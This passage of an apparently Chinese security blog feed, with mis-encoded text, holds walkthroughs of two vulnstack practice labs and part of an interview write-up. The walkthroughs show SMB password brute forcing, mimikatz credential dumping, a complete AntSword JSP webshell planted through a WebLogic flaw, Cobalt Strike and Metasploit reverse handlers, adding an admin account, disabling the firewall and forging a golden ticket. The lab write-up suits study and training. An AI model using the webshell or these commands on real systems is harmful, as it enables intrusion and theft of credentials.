<h4 id="å­˜æ´»ä¸»æœºæ¢æµ‹"><a href="#å­˜æ´»ä¸»æœºæ¢æµ‹" class="headerlink" title="å­˜æ´»ä¸»æœºæ¢æµ‹"></a>å­˜æ´»ä¸»æœºæ¢æµ‹</h4><h5 id="åˆ©ç”¨icmpåè®®æ¢æµ‹å­˜æ´»ä¸»æœº"><a href="#åˆ©ç”¨icmpåè®®æ¢æµ‹å­˜æ´»ä¸»æœº" class="headerlink" title="åˆ©ç”¨icmpåè®®æ¢æµ‹å­˜æ´»ä¸»æœº"></a>åˆ©ç”¨icmpåè®®æ¢æµ‹å­˜æ´»ä¸»æœº</h5><p><code>for k in $( seq 1 255);do ping -c 1 192.168.93.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done</code> æ‰«åˆ°5å°å­˜æ´»ä¸»æœº</p>
<p><img src="/posts/2ce9ab7f/icmp.png"></p>
<h5 id="smbæ‰«æ"><a href="#smbæ‰«æ" class="headerlink" title="smbæ‰«æ"></a>smbæ‰«æ</h5><p><code>use auxiliary/scanner/smb/smb_version</code></p>
<p><code> set rhosts 192.168.93.0/24</code></p>
<p><code>set thread 10</code></p>
<p><code>run</code></p>
<p>æ‰«åˆ°3å°windowsæœºå™¨</p>
<p><img src="/posts/2ce9ab7f/smb_10.png"></p>
<p><img src="/posts/2ce9ab7f/smb_20.png"></p>
<p><img src="/posts/2ce9ab7f/smb_30.png"></p>
<p>æ‰€ä»¥åŸŸå†…çš„5å°ä¸»æœºéƒ½å¯ä»¥ç¡®å®šäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.93.10	windows 2012</span><br><span class="line">192.168.93.20	windows 2008</span><br><span class="line">192.168.93.30	windows 7	</span><br><span class="line">192.168.93.100  centos</span><br><span class="line">192.168.93.120  ubuntu(nginxåå‘ä»£ç†)</span><br></pre></td></tr></table></figure>

<h4 id="å†…ç½‘ä¸»æœºç«¯å£æ¢æµ‹"><a href="#å†…ç½‘ä¸»æœºç«¯å£æ¢æµ‹" class="headerlink" title="å†…ç½‘ä¸»æœºç«¯å£æ¢æµ‹"></a>å†…ç½‘ä¸»æœºç«¯å£æ¢æµ‹</h4><p>ä½¿ç”¨nmapæ‰«æä¸€ä¸‹å†…ç½‘ä¸­çš„3å°windowsä¸»æœºå¼€æ”¾çš„ç«¯å£.</p>
<p><code>proxychains4 nmap 192.168.93.10 -Pn -sT -sV -F</code></p>
<p><img src="/posts/2ce9ab7f/nmap_10.png"></p>
<p>åŒæ ·çš„æ–¹æ³•æ‰«ä¸€ä¸‹20 30 ä¸»æœº</p>
<p><img src="/posts/2ce9ab7f/nmap_20.png"></p>
<p><img src="/posts/2ce9ab7f/nmap_30.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.93.10     80.135.139.445          win2012</span><br><span class="line">192.168.93.20     80,135,139,445,1433     win2008R2</span><br><span class="line">192.168.93.30     135,139,445             win7</span><br></pre></td></tr></table></figure>

<h4 id="æ¼æ´æ‰«æ"><a href="#æ¼æ´æ‰«æ" class="headerlink" title="æ¼æ´æ‰«æ"></a>æ¼æ´æ‰«æ</h4><p>ä½¿ç”¨ms17-010æ‰«ä¸€æ³¢æ¼æ´</p>
<p><code>use /scanner/smb/smb_ms17_010</code></p>
<p><img src="/posts/2ce9ab7f/ms17-010.png"></p>
<p>æ²¡æœ‰å‘ç°æ¼æ´</p>
<h4 id="å¼±å£ä»¤çˆ†ç ´"><a href="#å¼±å£ä»¤çˆ†ç ´" class="headerlink" title="å¼±å£ä»¤çˆ†ç ´"></a>å¼±å£ä»¤çˆ†ç ´</h4><p>å…ˆçˆ†ç ´ä¸€ä¸‹win2008R2ä¸»æœºçš„mssql smb</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login</span><br><span class="line">set rhosts 192.168.93.20</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set PASS_FILE &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;PASSWORD_top1000.txt</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>è‡ªå·±è·‘æ²¡è·‘å‡ºå¯†ç äº†â€¦.çœ‹äº†å…¶ä»–å¸ˆå‚…è·‘å‡ºæ¥çš„å¯†ç æ˜¯<code>123qwe!ASD</code></p>
<h4 id="ä½¿ç”¨wmiè¿æ¥shell"><a href="#ä½¿ç”¨wmiè¿æ¥shell" class="headerlink" title="ä½¿ç”¨wmiè¿æ¥shell"></a>ä½¿ç”¨wmiè¿æ¥shell</h4><p><code>proxychains4 python2 wmiexec.py  &#39;administrator:123qwe!ASD@192.168.93.20&#39;</code></p>
<p>æˆåŠŸè¿æ¥20ä¸»æœºçš„shell</p>
<p><img src="/posts/2ce9ab7f/wmiexec_shell_20.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br><span class="line">tasklist -V</span><br><span class="line">net view </span><br><span class="line">net view &#x2F;domain</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">åŸŸæ§æ˜¯192.168.93.10 </span><br><span class="line">åŸŸå†…æœ‰ä¸‰å°æœºå™¨  \\WIN-8GA56TNV3MV                                                              </span><br><span class="line">                \\WIN2008                                                                      </span><br><span class="line">                \\WIN7    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨smbclientä¸Šä¼ mimikatz"><a href="#ä½¿ç”¨smbclientä¸Šä¼ mimikatz" class="headerlink" title="ä½¿ç”¨smbclientä¸Šä¼ mimikatz"></a>ä½¿ç”¨smbclientä¸Šä¼ mimikatz</h4><p><code>proxychains4 smbclient //192.168.93.20/C$ -U administrator</code></p>
<p><img src="/posts/2ce9ab7f/smbclient.png"></p>
<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.log</code></p>
<p><img src="/posts/2ce9ab7f/logonpasswords.png"></p>
<p>å¾—åˆ°åŸŸæ§è´¦å·å¯†ç  <code>Administrator</code>   <code>zxcASDqw123!!</code></p>
<h4 id="ä½¿ç”¨ipcè¿æ¥åŸŸæ§"><a href="#ä½¿ç”¨ipcè¿æ¥åŸŸæ§" class="headerlink" title="ä½¿ç”¨ipcè¿æ¥åŸŸæ§"></a>ä½¿ç”¨ipcè¿æ¥åŸŸæ§</h4><p><code>net use \\192.168.93.10\ipc$ zxcASDqw123!! /user:&quot;TEST\Administrator&quot;</code></p>
<p><img src="/posts/2ce9ab7f/ipc_flag.png"></p>
<p>å¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack2é¶åœº</title>
    <url>/posts/8a9ea0cb/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ç»Ÿä¸€ç™»å½•å¯†ç  <code>1qaz@WSX</code></p>
<p>Webå¯†ç é”™è¯¯çš„ï¼Œåœ¨å¿«ç…§ç®¡ç†å™¨é‡Œé¢é€‰æ‹©è½¬åˆ°1.3å³å¯,é»˜è®¤ä¸ºç©ºï¼Œç„¶åä¿®æ”¹å¯†ç ä¸ºç»Ÿä¸€å¯†ç </p>
<p>ç„¶åå†webä¸»æœºä¸Šå¼€å¯WeblogicæœåŠ¡</p>
<p><img src="/posts/8a9ea0cb/start_weblogic.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dc    ä»…ä¸»æœº  10.10.10.10</span><br><span class="line">web   ä»…ä¸»æœº  10.10.10.80   NAT 192.168.0.80</span><br><span class="line">pc    ä»…ä¸»æœº  10.10.10.201  NAT 192.168.0.201</span><br><span class="line">kali  NAT     192.168.0.128</span><br></pre></td></tr></table></figure>

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="nmapæ‰«æç«¯å£"><a href="#nmapæ‰«æç«¯å£" class="headerlink" title="nmapæ‰«æç«¯å£"></a>nmapæ‰«æç«¯å£</h4><p>ç”¨kalipingä¸é€šwebä¸»æœºï¼Œåº”è¯¥æ˜¯å¼€å¯äº†é˜²ç«å¢™ç¦æ­¢äº†icmp</p>
<p><code>sudo nmap 192.168.0.80 -sV</code></p>
<blockquote>
<p>PORT      STATE SERVICE       VERSION<br>80/tcp    open  http          Microsoft IIS httpd 7.5<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2008 R2 10.50.4000; SP2<br>3389/tcp  open  ms-wbt-server Microsoft Terminal Service<br>7001/tcp  open  http          Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)<br>49152/tcp open  msrpc         Microsoft Windows RPC<br>49153/tcp open  msrpc         Microsoft Windows RPC<br>49154/tcp open  msrpc         Microsoft Windows RPC<br>49155/tcp open  msrpc         Microsoft Windows RPC<br>49156/tcp open  msrpc         Microsoft Windows RPC</p>
</blockquote>
<p><img src="/posts/8a9ea0cb/nmap.png"></p>
<p>å…ˆä»7001çš„weblogicä¸‹æ‰‹ï¼Œä½¿ç”¨WeblogicScanæ‰«æä¸€ä¸‹æ˜¯å¦å­˜åœ¨æ¼æ´</p>
<p><img src="/posts/8a9ea0cb/weblogicscan.png"></p>
<p>å¾—åˆ°åå°è·¯å¾„ä¸º<code>http://192.168.0.80:7001/console/login/LoginForm.jsp</code></p>
<p>æ£€æµ‹åˆ°å­˜åœ¨<code>CVE20192725</code> å’Œ ssrfæ¼æ´</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="åˆ©ç”¨ssrfæ¼æ´è¿›è¡Œç«¯å£æ¢æµ‹"><a href="#åˆ©ç”¨ssrfæ¼æ´è¿›è¡Œç«¯å£æ¢æµ‹" class="headerlink" title="åˆ©ç”¨ssrfæ¼æ´è¿›è¡Œç«¯å£æ¢æµ‹"></a>åˆ©ç”¨ssrfæ¼æ´è¿›è¡Œç«¯å£æ¢æµ‹</h4><p>å­˜åœ¨ä½ç½®<code>http://192.168.0.80:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
<p>æŠ“åŒ…æµ‹è¯•</p>
<p><img src="/posts/8a9ea0cb/ssrf1.png"></p>
<p>æ­¤å¤„çš„operatorä¸ºå¯æ§ç‚¹ï¼Œè¾“å…¥ä¸€ä¸ªå­˜åœ¨çš„ç«¯å£<code>127.0.0.1:7001</code> ä¼šè¿”å›ä¸€ä¸ªçŠ¶æ€ç </p>
<p><img src="/posts/8a9ea0cb/ssrf_7001.png"></p>
<p>è¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„ç«¯å£æ—¶<code>192.168.0.80:1234</code> ä¼šè¿”å›<code>but could not connect over HTTP to server</code></p>
<p><img src="/posts/8a9ea0cb/ssrf_1234.png"></p>
<p>è¾“å…¥<code>127.0.0.1:6379</code> è¿”å›<code>but could not connect over HTTP to server</code>è¯´æ˜æ²¡æœ‰å¼€æ”¾6379ç«¯å£ï¼Œæ²¡æ³•ç»§ç»­åˆ©ç”¨å»å¼¹redis shell</p>
<p><img src="/posts/8a9ea0cb/ssrf_6379.png"></p>
<p><a href="https://www.cnblogs.com/bmjoker/p/9759761.html">weblogic ssrfåˆ©ç”¨</a></p>
<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>ç›´æ¥ä½¿ç”¨6å“¥å¸ˆå‚…çš„javaååºåˆ—åŒ–ç»ˆææµ‹è¯•å·¥å…·.</p>
<p><img src="/posts/8a9ea0cb/java_tool1.png"></p>
<p><img src="/posts/8a9ea0cb/java_tool2.png"></p>
<p><a href="https://www.cnblogs.com/sstfy/p/10350915.html">weblogicä¸Šä¼ æœ¨é©¬æ—¶è·¯å¾„é€‰æ‹©</a></p>
<p>1.æŠŠshellå†™åˆ°æ§åˆ¶å°imagesç›®å½•ä¸­</p>
<p><code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</code></p>
<p>è®¿é—®<code>http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp</code></p>
<p>2.å†™åˆ°uddiexplorerç›®å½•ä¸­</p>
<p><code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\éšæœºå­—ç¬¦\war\shell.jsp</code></p>
<p>è®¿é—®<code>http://*.*.*.*:7001/uddiexplorer/shell.jsp</code></p>
<p>3.å†™åˆ°åº”ç”¨å®‰è£…ç›®å½•ä¸­</p>
<p><code>C:\Oracle\Middleware\user_projects\domains\application\servers\AdminServer\tmp\_WL_user\é¡¹ç›®å\éšæœºå­—ç¬¦\war\shell.jsp</code></p>
<p>è®¿é—®<code>http://*.*.*.*:7001/é¡¹ç›®å/shell.jsp</code></p>
<p>ä¸Šä¼ èšå‰‘çš„jspé©¬ã€‚å¯†ç ä¸ºant</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder &#x3D; clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls &#x3D; request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls !&#x3D; null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/8a9ea0cb/uploade_shell.png"></p>
<p>ä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥</p>
<p><img src="/posts/8a9ea0cb/ant_conn.png"></p>
<p>ç„¶åå¯ä»¥ä½¿ç”¨<code>As-Exploits</code>æ’ä»¶</p>
<p>å‘ç°è¯¥æœºå™¨ä¸Šæœ‰å®‰è£…360</p>
<h4 id="ä¸Šçº¿CS"><a href="#ä¸Šçº¿CS" class="headerlink" title="ä¸Šçº¿CS"></a>ä¸Šçº¿CS</h4><p>åœ¨CSä¸Šåˆ›å»ºlistener ç”Ÿæˆcs.exeåä½¿ç”¨èšå‰‘è¿è¡Œï¼ŒbeaconæˆåŠŸä¸Šçº¿</p>
<p><img src="/posts/8a9ea0cb/cs1.png"></p>
<h5 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æŸ¥çœ‹å½“å‰ç”¨æˆ·sid  shell whoami &#x2F;user</span><br><span class="line">æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯  shell systeminfo</span><br><span class="line">æŸ¥çœ‹åŸŸå      shell net config workstation</span><br><span class="line">æŸ¥çœ‹åŸŸå†…ç”¨æˆ·  shell net user &#x2F;domain</span><br><span class="line">æŸ¥çœ‹æœºå™¨ä¿¡æ¯  net computers </span><br><span class="line">æŸ¥çœ‹åŸŸå†…ä¸»æœº  shell net view</span><br><span class="line">æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ  shell net view &#x2F;domain</span><br><span class="line">æŸ¥çœ‹åŸŸç®¡ç†å‘˜  shell net group &quot;domain admins&quot; &#x2F;domain  </span><br><span class="line">æŸ¥çœ‹åŸŸæ§      shell net group &quot;domain controllers&quot; &#x2F;domain  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>shell whoami /user</code></p>
<p><img src="/posts/8a9ea0cb/cs_whoami_user.png"></p>
<p><code>shell systeminfo</code></p>
<p><img src="/posts/8a9ea0cb/cs_systeminfo.png"></p>
<p><code>shell net config workstation</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_config_workstation.png"></p>
<p><code>shell net user /domain</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_user_domain.png"></p>
<p><code>net computers</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_computers.png"></p>
<p>ä½¿ç”¨CSçš„portscanæ¨¡å—æ‰«æåŸŸå†…ä¸»æœºç«¯å£</p>
<p><img src="/posts/8a9ea0cb/cs_portscan.png"></p>
<p>å…³é—­é˜²ç«å¢™<code>netsh advfirewall set allprofiles state off</code></p>
<p><code>shell net view </code> å‘ç°æŠ¥é”™6118ï¼Œåœ¨ç½‘ä¸ŠæŸ¥äº†ä¸‹æ˜¯å› ä¸ºæ²¡æœ‰å¼€å¯<code>Computer Brower</code>æœåŠ¡ï¼Œå»çœ‹äº†ä¸‹ï¼ŒwebæœåŠ¡å™¨æŠŠè¯¥æœåŠ¡ç¦æ­¢äº†ï¼Œå¼€å¯åå°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ï¼ˆå› ä¸ºåˆšæ‰æ˜¯çš„æ—¶å€™webæœåŠ¡å™¨å¯†ç ç™»å½•ä¸ä¸Šå»ï¼Œç„¶ååˆ‡æ¢äº†å¿«ç…§ï¼Œæ‰‹åŠ¨å¼€å¯äº†webæœåŠ¡ï¼‰</p>
<p><img src="/posts/8a9ea0cb/cs_net_view.png"></p>
<p><code>shell net group &quot;domain admins&quot; /domain</code></p>
<p><code>shell net group &quot;domain controllers&quot; /domain </code></p>
<p><img src="/posts/8a9ea0cb/cs_shell_net_group.png"></p>
<p>ä½¿ç”¨CSçš„<code>run_mimikatz</code>æ¨¡å—</p>
<p><img src="/posts/8a9ea0cb/cs_run_mimikatz.png"></p>
<p>å¾—åˆ°å‡­æ®ä¿¡æ¯ï¼Œå¯†ç ä¸º<code>1qaz@WSX</code></p>
<p><img src="/posts/8a9ea0cb/cs_credentials.png"></p>
<h4 id="åˆ›å»ºç”¨æˆ·ç™»å½•3389"><a href="#åˆ›å»ºç”¨æˆ·ç™»å½•3389" class="headerlink" title="åˆ›å»ºç”¨æˆ·ç™»å½•3389"></a>åˆ›å»ºç”¨æˆ·ç™»å½•3389</h4><p>æŸ¥çœ‹3389æ˜¯å¦å¼€æ”¾</p>
<p><img src="/posts/8a9ea0cb/cs_nerstat_3389.png"></p>
<p><img src="/posts/8a9ea0cb/cs_new_user.png"></p>
<p>æ·»åŠ ç”¨æˆ·åˆ°ç®¡ç†å‘˜æƒé™ <code>shell net localgroup administrators Mamor /add</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_localgroup_administrators_Mamor_add.png"></p>
<p><code>sudo rdesktop 192.168.0.80:3389 </code> ä½¿ç”¨ <code>Mamor</code> <code>1qaz@WSX</code>æˆåŠŸç™»å½•</p>
<p><img src="/posts/8a9ea0cb/rdesktop.png"></p>
<p>(æ³¨ï¼šè¿™é‡Œçš„360é˜²æŠ¤å¥½åƒæ²¡æœ‰èµ·ä½œç”¨ï¼Œæ²¡æœ‰è¿›è¡Œæ‹¦æˆª)</p>
<h4 id="ä½¿ç”¨PSexecæ¨ªå‘ç§»åŠ¨"><a href="#ä½¿ç”¨PSexecæ¨ªå‘ç§»åŠ¨" class="headerlink" title="ä½¿ç”¨PSexecæ¨ªå‘ç§»åŠ¨"></a>ä½¿ç”¨PSexecæ¨ªå‘ç§»åŠ¨</h4><p>ä½¿ç”¨å’Œä¸Šä¸€ä¸ªé¶åœºä¸€æ ·çš„æ–¹æ³•ï¼Œåˆ›å»ºä¸€ä¸ªsmbç›‘å¬å™¨</p>
<p>åœ¨Targetsä¸­ é€‰æ‹©ä¸»æœºå³é”®jump-&gt; psexecï¼Œé€‰æ‹©ç¥¨æ®</p>
<p>ç„¶åå¾—åˆ°å¦‚å›¾ï¼Œå¯ä»¥é€šè¿‡è¿™ç§æ–¹æ³•å¾—åˆ°webæœºå™¨çš„systemæƒé™</p>
<p><img src="/posts/8a9ea0cb/cs_graph_view.png"></p>
<p>æˆåŠŸæ‹¿åˆ°åŸŸæ§DC.</p>
<h4 id="CSæ´¾ç”ŸMSF"><a href="#CSæ´¾ç”ŸMSF" class="headerlink" title="CSæ´¾ç”ŸMSF"></a>CSæ´¾ç”ŸMSF</h4><p>åœ¨CSä¸­åˆ›å»ºä¸€ä¸ª Foreign HTTP listener</p>
<p><img src="/posts/8a9ea0cb/cs_msf.png"></p>
<p>åœ¨msfä¸­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf exploit(multi&#x2F;handler) &gt;  set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set &#x3D;&gt; payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.128</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.128</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lport 6666</span><br><span class="line">lport &#x3D;&gt; 6666</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="/posts/8a9ea0cb/cs_msf_shell.png"></p>
<p>msfæ·»åŠ è·¯ç”±</p>
<p><img src="/posts/8a9ea0cb/msf_autoroute.png"></p>
<p><img src="/posts/8a9ea0cb/route_print.png"></p>
<p>é…ç½®ä»£ç†ï¼Œåœ¨proxychains4è®¾ç½®127.0.0.1 1080</p>
<p><img src="/posts/8a9ea0cb/socks_proxy.png"></p>
<h4 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h4><h5 id="åŸŸæ§ä¿¡æ¯æ”¶é›†"><a href="#åŸŸæ§ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸæ§ä¿¡æ¯æ”¶é›†"></a>åŸŸæ§ä¿¡æ¯æ”¶é›†</h5><p>åœ¨åŸŸæ§è·å–krbtgtè´¦æˆ·çš„NTLM hashå€¼å’ŒSID</p>
<p><img src="/posts/8a9ea0cb/dc_hashdump.png"></p>
<p><code>82dfc71b72a11ef37d663047bc2088fb</code></p>
<p><img src="/posts/8a9ea0cb/dc_logonpasswords.png"></p>
<p>SID <code>S-1-5-21-2756371121-2868759905-3853650604</code></p>
<h5 id="é»„é‡‘ç¥¨æ®åˆ©ç”¨"><a href="#é»„é‡‘ç¥¨æ®åˆ©ç”¨" class="headerlink" title="é»„é‡‘ç¥¨æ®åˆ©ç”¨"></a>é»„é‡‘ç¥¨æ®åˆ©ç”¨</h5><p>é»„é‡‘ç¥¨æ®æ—¶ä¼ªé€ ç¥¨æ®æˆäºˆç¥¨æ®(TGT)</p>
<p>åˆ©ç”¨éœ€è¦çš„æ¡ä»¶:</p>
<p>1.åŸŸåç§°</p>
<p>2.åŸŸçš„SIDå€¼</p>
<p>3.åŸŸçš„KRBTGTè´¦æˆ·NTLMå¯†ç å“ˆå¸Œ</p>
<p>4.ä¼ªé€ ç”¨æˆ·å</p>
<p>ä½¿ç”¨CSæ¸…é™¤clientç«¯(åŸŸå†…å…¶ä»–æœºå™¨)çš„ç¥¨æ®</p>
<p><code>kerberos_ticket_purge</code></p>
<p><code>shell klist</code>æŸ¥çœ‹ç¥¨æ®ä¿¡æ¯æ˜¯å¦å·²ç»è¢«æ¸…é™¤</p>
<p><img src="/posts/8a9ea0cb/cs_shell_kilist.png"></p>
<p>ä½¿ç”¨CSç”Ÿæˆé»„é‡‘ç¥¨æ®</p>
<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket.png"></p>
<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket2.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡é•¿äº­å®‰å…¨ç ”ç©¶å‘˜å®ä¹ ç”Ÿé¢è¯•çš„ç»å†</title>
    <url>/posts/e38ec14f/</url>
    <content><![CDATA[<p>å‰è¨€:è¿™ä¸ªæ˜¯åœ¨bossä¸Šhræ˜¨å¤©è”ç³»çš„æˆ‘ï¼Œç„¶åä»Šå¤©ä¸‹åˆé€šçŸ¥æˆ‘æ™šä¸Šè¿›è¡Œé¢è¯•â€¦è¯´çš„ä¸»è¦æ˜¯ç ”ç©¶æ¯”èµ›ä¹‹ç±»çš„ï¼Œæˆ‘è¯´è¿™ä¸ªæˆ‘ä¸æ˜¯å¾ˆæ“…é•¿ï¼Œç„¶åå°±å°è¯•ä¸€ä¸‹å§</p>
<hr>
<p>1.è‡ªæˆ‘ä»‹ç»</p>
<p>2.ä¸ªäººè§„åˆ’</p>
<p>3.è¿‘æœŸå‚åŠ çš„æ¯”èµ›ï¼Œå¾—è¿‡ä»€ä¹ˆæˆç»©å—</p>
<p>4.ä½ è®¤ä¸ºä»€ä¹ˆæ˜¯ä¸€é“ä¼˜ç§€çš„é¢˜ç›®</p>
<p>å›ç­”çš„ä¸»è¦æ„æ€å°±æ˜¯å¸Œæœ›é¢˜ç›®æ›´è´´è¿‘äºå®é™…ç¯å¢ƒ</p>
<p>5.æ—¶é—´ç›²æ³¨ç”¨åˆ°çš„å‡½æ•°æœ‰å“ªäº›ï¼Ÿå¦‚æœsleepè¢«ç¦ç”¨äº†è¿˜æœ‰ä»€ä¹ˆå‡½æ•°å¯ä»¥æ›¿ä»£</p>
<p>if sleep substr ï¼Œé—®sleepçš„æ›¿ä»£å‡½æ•°æ—¶æ²¡æƒ³åˆ°ï¼Œä¹‹å‰æ²¡æ¥è§¦è¿‡ç„¶åæŸ¥äº†ä¸‹æ˜¯<code>benchmark</code></p>
<p>6.ä»€ä¹ˆæ˜¯äºŒæ¬¡æ³¨å…¥</p>
<p>ç¬¬ä¸€æ¬¡æ³¨å…¥åæ•°æ®ä¸­å­˜åœ¨è„æ•°æ®ï¼Œç„¶åå†æ¬¡è°ƒç”¨æ—¶æ²¡æœ‰å¯¹å­˜åœ¨è„æ•°æ®çš„æ•°æ®è¿›è¡Œæ£€æµ‹ï¼Œæ‰§è¡Œäº†æ•°æ®åº“å‘½ä»¤ï¼Œä»è€Œä½¿é€ æˆäº†æ•°æ®åº“çš„æ³¨å…¥</p>
<p>7.äº†è§£ååºåˆ—åŒ–å—ï¼Œè¯´ä¸€ä¸‹ååºåˆ—åŒ–æ¼æ´çš„åŸç†</p>
<p>ååºåˆ—åŒ–å°±æ˜¯å°†å­—ç¬¦æ•°æ®è½¬æ¢ä¸ºå¯¹è±¡è¿›è¡Œå­˜å‚¨ï¼Œç„¶åå†ååºåˆ—åŒ–çš„</p>
<p>ä¹‹å‰æ¥è§¦è¿‡shiroååºåˆ—åŒ–ï¼Œfastjosnï¼Œweblogic</p>
<p>æ‹¿shiroååºåˆ—åŒ–ä¸¾ä¾‹å­ï¼Œshiroçš„RememberMeå­—æ®µçš„å€¼ä¼šå…ˆè¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åå†è¿›è¡ŒAESåŠ å¯†ï¼Œåœ¨è¿›è¡Œbase64åŠ å¯†ã€‚ç›¸å¯¹çš„ï¼Œè§£å¯†è¿‡ç¨‹åˆ™æ˜¯å…ˆå¯¹RememberMeçš„å€¼è¿›è¡Œbase64è§£å¯†ï¼ŒAESè§£å¯†ï¼Œååºåˆ—åŒ–ã€‚é‚£ä¹ˆå¯ä»¥å°†æ„é€ æ¶æ„ä»£ç çš„è¯­å¥æ”¾åˆ°Shiroçš„Cookie RememberMeä¸­ï¼Œè¢«shiroæœåŠ¡å™¨è¿›è¡Œè§£ææ—¶ï¼Œä¼šè¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€åæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œä»è€Œé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>8.è¯´ä¸€ä¸‹ä½ å°è±¡è¾ƒæ·±çš„é¢˜ç›®</p>
